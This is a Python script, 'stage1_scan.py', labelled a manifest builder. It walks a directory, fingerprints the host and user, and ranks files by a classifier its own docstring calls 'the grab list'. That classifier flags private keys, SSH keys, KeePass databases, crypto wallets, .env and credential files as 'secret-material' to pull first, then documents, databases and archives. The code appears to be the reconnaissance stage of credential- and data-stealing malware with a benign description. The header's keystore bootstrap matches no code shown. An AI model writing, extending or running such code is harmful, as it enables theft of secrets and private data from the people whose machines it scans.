# stage1_scan.py  — manifest builder + config/keystore bootstrap
# deps: pip install pywin32  (windows only), nothing else on linux/mac
import os, sys, json, time, hashlib, base64, stat, argparse, platform, socket, getpass

SKIP_DIRS = {".git", "__pycache__", "node_modules", ".venv", "venv", ".mypy_cache"}
MAX_BYTES = 512 * 1024 * 1024 # hard ceiling per file, 512 MiB
MAX_ENTRIES = 200_000                    # hard ceiling per walk

def _sha256_head(path, n=65536):
    h = hashlib.sha256()
    try:
        with open(path, "rb") as f:
            h.update(f.read(n))
    except OSError:
        pass
    return h.hexdigest()

def scan_directory(root):
    """scan_directory(root) -> [(path, size, mtime)]  — walk root, skip noise dirs."""
    out, seen = [], 0
    root = os.path.abspath(root)
    for dirpath, dirnames, filenames in os.walk(root, followlinks=False):
        dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS]
        for name in filenames:
            p = os.path.join(dirpath, name)
            try:
                st = os.stat(p, follow_symlinks=False)
            except OSError:
                continue
            if stat.S_ISREG(st.st_mode) and st.st_size <= MAX_BYTES:
                out.append((p, st.st_size, int(st.st_mtime)))
            seen += 1
            if seen >= MAX_ENTRIES:
                return out
    return out

def write_manifest(root, entries, dest="manifest.json"):
    manifest = {
        "version": 1,
        "root": os.path.abspath(root),
        "created": int(time.time()),
        "host": {
            "node": socket.gethostname(),
            "user": _whoami(),
            "platform": platform.platform(),
            "release": platform.release(),
            "arch": platform.machine(),
            "python": platform.python_version(),
        },
        "count": len(entries),
        "total_bytes": sum(e[1] for e in entries),
        "entries": [
            {
                "path": p,
                "rel": os.path.relpath(p, root),
                "size": s,
                "mtime": t,
                "head_sha256": _sha256_head(p),
                "interesting": _classify(p, s),
            }
            for p, s, t in entries
        ],
    }
    with open(dest, "w", encoding="utf-8") as f:
        json.dump(manifest, f, indent=2)
    return dest

def _classify(path, size):
    """flag file types worth pulling first — the grab list."""
    low = path.lower()
    if any(k in low for k in (".pem", ".key", ".pfx", ".p12", ".ppk", ".kdbx",
 "id_rsa", "credentials", "wallet.dat", ".env")):
        return "secret-material"
    if any(k in low for k in (".doc", ".docx", ".xls", ".xlsx", ".pdf", ".pst")):
        return "document"
    if any(k in low for k in (".sql", ".sqlite", ".db", ".bak", ".dump")):
        return "database"
    if low.endswith((".zip", ".7z", ".rar", ".tar.gz", ".iso")):
        return "archive"
    return "other"

def _whoami():
    try:
        return getpass.getuser()
    except Exception:
        return "unknown"

